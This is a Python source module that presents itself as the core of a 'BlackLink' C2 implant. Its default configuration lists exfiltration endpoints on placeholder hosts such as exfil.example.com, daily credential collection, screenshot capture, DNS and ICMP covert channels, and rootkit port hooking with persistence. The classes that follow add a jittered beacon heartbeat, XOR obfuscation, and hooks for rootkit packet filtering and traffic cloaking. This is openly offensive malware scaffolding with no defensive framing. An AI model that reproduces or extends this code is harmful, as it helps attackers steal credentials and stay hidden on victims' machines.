"""
BlackLink Core Module
Core components for BlackLink C2 implant functionality
"""

import os
import time
import random
import socket
import platform
import threading
import base64
import json
import logging
import zlib
import queue
import hashlib
import uuid
from datetime import datetime
from typing import Dict, Any, List, Optional, Tuple, Union, Callable

from .protocol_handlers import ProtocolManager

class BlackLinkConfig:
    """Configuration manager for BlackLink implants"""
    
    # Default configuration
    DEFAULT_CONFIG = {
        "fallback_domains": ["cdn.example.com", "api.example.net"],
        "communication_protocols": ["http", "dns", "icmp"],
        "primary_protocol": "http",
        "max_retries": 5,
        "retry_delay": 60,
        "protocol_rotation": True,
        "protocol_rotation_interval": 3600,  # 1 hour
        "heartbeat_interval": 300,  # 5 minutes
        "heartbeat_jitter": 20,  # 20% jitter
        "exfiltration": {
            "enabled": True,
            "targets": ["https://exfil.example.com/upload", "exfil.example.net"],
            "protocols": ["http", "dns"],
            "max_chunk_size": 1024 * 10,  # 10KB chunks
            "base_delay": 300,  # 5 minutes between exfiltrations
            "jitter": 30,  # 30% jitter
            "dns_domain": "exfil.example.com",
            "smb_params": {
                "share": "Data",
                "username": "",
                "password": ""
            }
        },
        "collection": {
            "scheduled_collections": [
                {"type": "credentials", "interval": 86400},  # Daily
                {"type": "system", "interval": 3600},        # Hourly
                {"type": "screenshots", "interval": 1800}    # Every 30 minutes
            ]
        },
        "network": {
            "packet_filter": {
                "enabled": False,
                "protocols": ["tcp", "udp", "dns", "icmp"]
            },
            "packet_capture": {
                "enabled": False,
                "max_packets": 1000,
                "rotation": True
            },
            "rootkit": {
                "auto_install": False,
                "install_persistence": False,
                "hooked_ports": [80, 443, 53],
                "hooked_protocols": ["tcp", "udp", "icmp", "dns"]
            }
        }
    }
    
    def __init__(self, config_dict: Optional[Dict[str, Any]] = None):
        """Initialize configuration
        
        Args:
            config_dict: Configuration dictionary (optional)
        """
        self.config = self.DEFAULT_CONFIG.copy()
        
        # Apply provided config
        if config_dict:
            self.update_config(config_dict)
    
    def update_config(self, update_dict: Dict[str, Any]) -> None:
        """Update configuration recursively
        
        Args:
            update_dict: Configuration updates
        """
        self._update_dict_recursive(self.config, update_dict)
    
    def _update_dict_recursive(self, base_dict: Dict[str, Any], update_dict: Dict[str, Any]) -> None:
        """Update dictionary recursively
        
        Args:
            base_dict: Base dictionary to update
            update_dict: Dictionary with updates
        """
        for key, value in update_dict.items():
            if key in base_dict and isinstance(base_dict[key], dict) and isinstance(value, dict):
                self._update_dict_recursive(base_dict[key], value)
            else:
                base_dict[key] = value
    
    def get(self, key: str, default: Any = None) -> Any:
        """Get configuration value
        
        Args:
            key: Configuration key (can use dot notation for nested keys)
            default: Default value if key not found
            
        Returns:
            Configuration value
        """
        keys = key.split('.')
        value = self.config
        
        try:
            for k in keys:
                value = value[k]
            return value
        except (KeyError, TypeError):
            return default


class HeartbeatManager:
    """Manages implant heartbeats to C2"""
    
    def __init__(self, config: Dict[str, Any], heartbeat_callback: Callable):
        """Initialize heartbeat manager
        
        Args:
            config: Heartbeat configuration
            heartbeat_callback: Function to call for heartbeat
        """
        self.config = config
        self.heartbeat_callback = heartbeat_callback
        self.running = False
        self.heartbeat_thread = None
        self.heartbeat_interval = config.get("heartbeat_interval", 300)
        self.jitter = config.get("heartbeat_jitter", 20)
        self.stats = {
            "sent": 0,
            "failed": 0,
            "last_success": None
        }
    
    def start(self):
        """Start heartbeat manager"""
        if self.running:
            return
        
        self.running = True
        self.heartbeat_thread = threading.Thread(target=self._heartbeat_worker)
        self.heartbeat_thread.daemon = True
        self.heartbeat_thread.start()
        
    def stop(self):
        """Stop heartbeat manager"""
        self.running = False
        if self.heartbeat_thread:
            self.heartbeat_thread.join(timeout=2)
            self.heartbeat_thread = None
    
    def _heartbeat_worker(self):
        """Heartbeat worker thread function"""
        while self.running:
            # Send heartbeat
            try:
                success = self.heartbeat_callback()
                
                if success:
                    self.stats["sent"] += 1
                    self.stats["last_success"] = datetime.utcnow().isoformat()
                else:
                    self.stats["failed"] += 1
                    
            except Exception as e:
                logging.error(f"Error in heartbeat: {e}")
                self.stats["failed"] += 1
            
            # Sleep with jitter
            interval = self._calculate_interval()
            time.sleep(interval)
    
    def _calculate_interval(self) -> float:
        """Calculate interval with jitter
        
        Returns:
            Interval in seconds
        """
        jitter_factor = 1 + random.uniform(-self.jitter/100, self.jitter/100)
        return self.heartbeat_interval * jitter_factor


class DataCompressor:
    """Compresses and decompresses data"""
    
    @staticmethod
    def compress(data: bytes, level: int = 9) -> bytes:
        """Compress data using zlib
        
        Args:
            data: Data to compress
            level: Compression level (0-9, 9 being highest)
            
        Returns:
            Compressed data
        """
        return zlib.compress(data, level)
    
    @staticmethod
    def decompress(data: bytes) -> bytes:
        """Decompress zlib-compressed data
        
        Args:
            data: Compressed data
            
        Returns:
            Decompressed data
        """
        return zlib.decompress(data)


class BlackLinkCryptoUtil:
    """Cryptographic utilities for BlackLink"""
    
    @staticmethod
    def encrypt(data: bytes, key: bytes) -> bytes:
        """Simple XOR encryption (for demonstration; use proper crypto in production)
        
        Args:
            data: Data to encrypt
            key: Encryption key
            
        Returns:
            Encrypted data
        """
        if not key:
            return data
            
        result = bytearray(len(data))
        for i in range(len(data)):
            result[i] = data[i] ^ key[i % len(key)]
        return bytes(result)
    
    @staticmethod
    def decrypt(data: bytes, key: bytes) -> bytes:
        """Simple XOR decryption (for demonstration; use proper crypto in production)
        
        Args:
            data: Data to decrypt
            key: Decryption key
            
        Returns:
            Decrypted data
        """
        # XOR is symmetric, so encryption and decryption are the same
        return BlackLinkCryptoUtil.encrypt(data, key)
    
    @staticmethod
    def generate_key(seed: str = None) -> bytes:
        """Generate encryption key
        
        Args:
            seed: Seed for key generation
            
        Returns:
            Encryption key
        """
        if seed:
            # Generate key from seed
            return hashlib.sha256(seed.encode()).digest()
        else:
            # Generate random key
            return os.urandom(32)
    
    @staticmethod
    def hash_data(data: bytes) -> str:
        """Hash data for verification
        
        Args:
            data: Data to hash
            
        Returns:
            Hash as hexadecimal string
        """
        return hashlib.sha256(data).hexdigest()


class BlackWireIntegrator:
    """Provides integration between BlackLink and BlackWire components"""
    
    def __init__(self, blacklink_implant, config: Dict[str, Any] = None):
        """Initialize the integration manager
        
        Args:
            blacklink_implant: BlackLink implant instance
            config: Integration configuration
        """
        self.config = config or {}
        self.blacklink = blacklink_implant
        
        # Check if blacklink inherits from blackwire
        self.is_blackwire_enabled = hasattr(self.blacklink, 'rootkit')
        
        # Status tracking
        self.status = {
            "integrated": self.is_blackwire_enabled,
            "packet_filter_enabled": False,
            "packets_processed": 0,
            "packets_intercepted": 0
        }
    
    def enable_packet_filtering(self):
        """Enable packet filtering functionality"""
        if not self.is_blackwire_enabled:
            return False
            
        if hasattr(self.blacklink.rootkit, 'install_hooks'):
            self.blacklink.rootkit.install_hooks()
            self.status["packet_filter_enabled"] = True
            return True
            
        return False
    
    def disable_packet_filtering(self):
        """Disable packet filtering functionality"""
        if not self.is_blackwire_enabled:
            return False
            
        if hasattr(self.blacklink.rootkit, 'remove_hooks'):
            self.blacklink.rootkit.remove_hooks()
            self.status["packet_filter_enabled"] = False
            return True
            
        return False
    
    def update_traffic_cloaking(self, protocol: str = None):
        """Update traffic cloaking configuration
        
        Args:
            protocol: Protocol to use for cloaking (optional)
        """
        if not self.is_blackwire_enabled:
            return
            
        if hasattr(self.blacklink, 'cloaking_engine') and protocol:
            self.blacklink.cloaking_engine.set_active_protocol(protocol)
    
    def get_status(self) -> Dict[str, Any]:
        """Get integration status
        
        Returns:
            Status information
        """
        # Update status from packet filter if available
        if (self.is_blackwire_enabled and 
            hasattr(self.blacklink.rootkit, 'packet_filter') and 
            hasattr(self.blacklink.rootkit.packet_filter, 'get_stats')):
            
            stats = self.blacklink.rootkit.packet_filter.get_stats()
            self.status.update(stats)
            
        return self.status
